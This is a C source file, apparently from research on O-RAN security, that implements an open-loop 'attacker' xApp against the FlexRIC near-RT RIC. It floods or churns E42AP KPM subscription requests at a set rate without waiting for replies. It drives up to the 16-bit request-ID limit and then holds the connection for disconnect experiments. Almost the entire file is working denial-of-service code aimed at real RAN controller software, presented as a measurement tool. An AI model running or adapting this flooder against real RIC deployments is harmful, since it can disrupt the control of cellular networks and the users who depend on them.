/*
 * xapp_async.c — 异步（open-loop）E42AP 攻击器（R1-A）
 *
 * 与 SDK 同步版（xapp_flood/xapp_churn）差异：配合 FlexRIC 的
 * [SYNC]/[PENDING] 环境变量补丁（FLEXRIC_SYNC_WAIT_MS=0 + FLEXRIC_PENDING_TIMEOUT_MS
 * 大值），report_sm_xapp_api / rm_report_sm_xapp_api 发送后立即返回，
 * 不等 RIC 响应、不因 5s pending 定时器到期自杀 —— 消除 closed-loop
 * 负载发生器随 RIC 变慢自我节流的 coordinated omission（Gil Tene），
 * 攻击压力恒定=open-loop。
 *
 * 报文由 FlexRIC SDK 原生编码器生成（与良性 xApp 逐字节同源），
 * SCTP 传输走 SDK 自有路径（PPID=0，源码+抓包双重实证）。
 *
 * 用法: xapp_async <mode> <rate> <dur_s> [batch]
 *   mode: flood（只订不删）| churn（batch 订 + batch 删循环）
 *   rate: 目标 req/s（0=全速）
 *   dur_s: 持续秒数；batch: churn 每轮订阅笔数（默认 60）
 * 运行前须设: FLEXRIC_SYNC_WAIT_MS=0 FLEXRIC_PENDING_TIMEOUT_MS=86400000
 */
#include "../../../../src/xApp/e42_xapp_api.h"
#include "../../../../src/util/alg_ds/alg/defer.h"
#include "../../../../src/util/time_now_us.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

static
kpm_event_trigger_def_t gen_ev_trig(uint64_t period)
{
  kpm_event_trigger_def_t dst = {0};
  dst.type = FORMAT_1_RIC_EVENT_TRIGGER;
  dst.kpm_ric_event_trigger_format_1.report_period_ms = period;
  return dst;
}

static
meas_info_format_1_lst_t gen_meas_info_format_1_lst(const char* action)
{
  meas_info_format_1_lst_t dst = {0};
  dst.meas_type.type = NAME_MEAS_TYPE;
  dst.meas_type.name = cp_str_to_ba(action);
  dst.label_info_lst_len = 1;
  dst.label_info_lst = calloc(1, sizeof(label_info_lst_t));
  assert(dst.label_info_lst != NULL && "Memory exhausted");
  dst.label_info_lst[0].noLabel = calloc(1, sizeof(enum_value_e));
  assert(dst.label_info_lst[0].noLabel != NULL && "Memory exhausted");
  *dst.label_info_lst[0].noLabel = TRUE_ENUM_VALUE;
  return dst;
}

static
kpm_act_def_format_1_t gen_act_def_frmt_1(const char** action)
{
  kpm_act_def_format_1_t dst = {0};
  dst.gran_period_ms = 100;
  size_t count = 0;
  while (action[count] != NULL) count++;
  dst.meas_info_lst_len = count;
  dst.meas_info_lst = calloc(count, sizeof(meas_info_format_1_lst_t));
  assert(dst.meas_info_lst != NULL && "Memory exhausted");
  for(size_t i = 0; i < dst.meas_info_lst_len; ++i)
    dst.meas_info_lst[i] = gen_meas_info_format_1_lst(action[i]);
  return dst;
}

static
kpm_act_def_t gen_act_def(const char** act)
{
  kpm_act_def_t dst = {0};
  dst.type = FORMAT_1_ACTION_DEFINITION;
  dst.frm_1 = gen_act_def_frmt_1(act);
  return dst;
}

static void sm_cb_kpm(sm_ag_if_rd_t const* rd)
{
  (void)rd;
}

volatile sig_atomic_t stop_flag = 0;
static void on_sigint(int sig){ (void)sig; stop_flag = 1; }

/* [R1F] SDK SCTP 发送失败计数（流控丢弃），见 e2ap_ep.c */
extern long g_e2ap_snd_fail_cnt;

int main(int argc, char *argv[])
{
  if(argc < 4){
    fprintf(stderr, "usage: %s <flood|churn> <rate_req_s|0=full> <dur_s> [batch=60]\n"
                    "requires env: FLEXRIC_SYNC_WAIT_MS=0 FLEXRIC_PENDING_TIMEOUT_MS=86400000\n", argv[0]);
    return 1;
  }
  int churn_mode = (strcmp(argv[1], "churn") == 0);
  long rate = atol(argv[2]);
  long dur_s = atol(argv[3]);
  long batch = (argc > 4) ? atol(argv[4]) : 60;

  const char* sw = getenv("FLEXRIC_SYNC_WAIT_MS");
  const char* pt = getenv("FLEXRIC_PENDING_TIMEOUT_MS");
  if(sw == NULL || atoi(sw) != 0 || pt == NULL){
    fprintf(stderr, "[async] WARNING: FLEXRIC_SYNC_WAIT_MS!=0 → closed-loop 语义（将同步等待）\n");
  }

  fr_args_t args = init_fr_args(argc, argv);
  init_xapp_api(&args);
  sleep(1);

  e2_node_arr_t nodes = e2_nodes_xapp_api();
  defer({ free_e2_node_arr(&nodes); });
  assert(nodes.len > 0);
  printf("[async] mode=%s rate=%ld/s dur=%lds batch=%ld nodes=%d\n",
         churn_mode ? "churn" : "flood", rate, dur_s, batch, nodes.len);

  signal(SIGINT, on_sigint);
  signal(SIGTERM, on_sigint);

  const int KPM_ran_function = 2;
  long sent_sub = 0, sent_del = 0, refused = 0;
  /* [R1] E2AP RIC RequestID 16-bit 空间上限：单 xApp 连接生命周期内总订阅数 ≤65535
     （SDK act_proc req_id 溢出 assert——攻击者自然天花板，协议空间观察）。全速档到顶即收。 */
  const long REQ_ID_CEILING = 65400;
  sm_ans_xapp_t* handles = calloc((size_t)(nodes.len * batch), sizeof(sm_ans_xapp_t));
  assert(handles != NULL && "Memory exhausted");

  // open-loop 速率调度
  int64_t interval = (rate > 0) ? (int64_t)(1e6 / rate) : 0;
  int64_t t_start = time_now_us();
  int64_t t_next = t_start;
  int64_t t_end = t_start + dur_s * 1000000L;
  int64_t t_last_report = t_start;

  while(stop_flag == 0 && time_now_us() < t_end && (sent_sub + sent_del) < REQ_ID_CEILING){
    // ---- 阶段 1：订阅（flood=1 笔/轮，churn=batch 笔/轮）----
    long n_sub = churn_mode ? batch : 1;
    for(long b = 0; b < n_sub; ++b){
      if(time_now_us() >= t_end) break;
      if(interval > 0){
        int64_t now = time_now_us();
        if(now < t_next){
          while(time_now_us() < t_next - 100) usleep(50);
          while(time_now_us() < t_next) ;
        }
        t_next += interval;
      }
      int i = (int)(b % nodes.len);
      kpm_sub_data_t kpm_sub = {0};
      defer({ free_kpm_sub_data(&kpm_sub); });
      kpm_sub.ev_trg_def = gen_ev_trig(100);
      kpm_sub.sz_ad = 1;
      kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
      assert(kpm_sub.ad != NULL);
      const char *act_gnb[] = {"DRB.RlcSduDelayDl", NULL};
      *kpm_sub.ad = gen_act_def(act_gnb);

      sm_ans_xapp_t h = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub, sm_cb_kpm);
      if(h.success == false) refused++; else sent_sub++;
      if(churn_mode) handles[b] = h;
    }
    // ---- 阶段 2：churn 删除 ----
    if(churn_mode){
      for(long b = 0; b < batch; ++b){
        if(time_now_us() >= t_end) break;
        if(handles[b].success == false) continue;
        if(interval > 0){
          int64_t now = time_now_us();
          if(now < t_next){
            while(time_now_us() < t_next - 100) usleep(50);
            while(time_now_us() < t_next) ;
          }
          t_next += interval;
        }
        rm_report_sm_xapp_api(handles[b].u.handle);
        handles[b].success = false;
        sent_del++;
      }
    }
    int64_t now = time_now_us();
    if(now - t_last_report >= 1000000L){
      double el = (now - t_start) / 1e6;
      printf("[async] t=%.1fs subs=%ld dels=%ld refused=%ld sndfail=%ld ops_rate=%.0f/s\n",
             el, sent_sub, sent_del, refused, g_e2ap_snd_fail_cnt,
             (sent_sub + sent_del) / el);
      fflush(stdout);
      t_last_report = now;
    }
  }

  int64_t now = time_now_us();
  double el = (now - t_start) / 1e6;
  printf("[async] DONE t=%.2fs subs=%ld dels=%ld refused=%ld sndfail=%ld total=%ld avg=%.0f/s\n",
         el, sent_sub, sent_del, refused, g_e2ap_snd_fail_cnt, sent_sub + sent_del,
         (sent_sub + sent_del) / el);
  fflush(stdout);

  // 挂住连接供 kill -9 / 断连残留实验（与 xapp_flood 行为一致）
  printf("[async] holding connection (sleep)... external kill -9 triggers disconnect path\n");
  fflush(stdout);
  while(stop_flag == 0) sleep(1);

  free(handles);
  /* try_stop 带超时：事件循环可能因 RIC 崩溃/发送阻塞卡住（防 hang） */
  {
    int64_t t_try = time_now_us();
    while(try_stop_xapp_api() == false){
      if(time_now_us() - t_try > 10000000L){ // 10s
        printf("[async] try_stop timeout, force exit\n"); break;
      }
      usleep(1000);
    }
  }
  printf("[async] exit\n");
  return 0;
}
